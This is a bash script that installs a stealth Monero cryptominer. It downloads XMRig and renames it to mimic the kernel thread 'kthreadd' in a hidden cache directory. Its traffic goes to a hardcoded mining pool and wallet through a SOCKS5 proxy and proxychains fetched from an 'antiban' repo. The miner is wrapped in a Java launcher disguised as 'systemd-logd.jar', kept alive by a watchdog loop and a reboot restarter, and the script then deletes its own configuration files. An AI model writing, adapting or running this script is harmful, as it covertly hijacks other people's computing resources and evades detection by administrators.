#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="24.199.99.228:1935"
SOCKS5_IP="116.100.220.220"
SOCKS5_PORT="1080"
WORKER="stealth-$(date +%s)"
DIR="$HOME/.cache/.kthreadd"

# === SETUP ===
mkdir -p "$DIR" && cd "$DIR"

# === DOWNLOAD XMRIG ===
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm xmrig.tar.gz
mv xmrig kthreadd
chmod +x kthreadd

# === PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $SOCKS5_IP $SOCKS5_PORT
EOF

# === XMRIG CONFIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": { "enabled": true },
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET.$WORKER",
    "pass": "Pedro",
    "keepalive": true,
    "tls": true
  }]
}
EOF

# === JAVA LAUNCHER ===
cat > Launcher.java <<EOF
import java.io.*; import java.util.*;
public class Launcher {
  public static void main(String[] args) {
    while (true) {
      try {
        Thread.sleep(5000);
        new ProcessBuilder("bash", "-c",
          "LD_PRELOAD=" + System.getenv("PWD") + "/libproxychains.so.4 PROXYCHAINS_CONF_FILE=" +
          System.getenv("PWD") + "/proxychains.conf ./kthreadd --config=config.json")
          .redirectOutput(new File("/dev/null")).redirectErrorStream(true)
          .start().waitFor();
      } catch (Exception e) {}
    }
  }
}
EOF

javac Launcher.java
jar cfe systemd-logd.jar Launcher Launcher.class
rm Launcher.java Launcher.class

# === JALANKAN MINER ===
nohup java -jar systemd-logd.jar >/dev/null 2>&1 &
disown

# === WATCHDOG ===
cat > watchdog.sh <<EOF
#!/bin/bash
while true; do
  pgrep -f systemd-logd.jar >/dev/null || nohup java -jar systemd-logd.jar >/dev/null 2>&1 &
  sleep 60
done
EOF
chmod +x watchdog.sh
nohup ./watchdog.sh >/dev/null 2>&1 &
disown

# === STARTER MANUAL PENGGANTI CRON ===
echo -e '#!/bin/bash\ncd '$DIR'\nnohup java -jar systemd-logd.jar >/dev/null 2>&1 &' > $HOME/.reboot.sh
chmod +x $HOME/.reboot.sh

# === CLEANUP ===
(sleep 10 && rm -f install.sh config.json watchdog.sh proxychains.conf *.log >/dev/null 2>&1) &

echo "[✓] Stealth miner aktif tanpa crontab. Jalankan ulang via: bash ~/.reboot.sh"
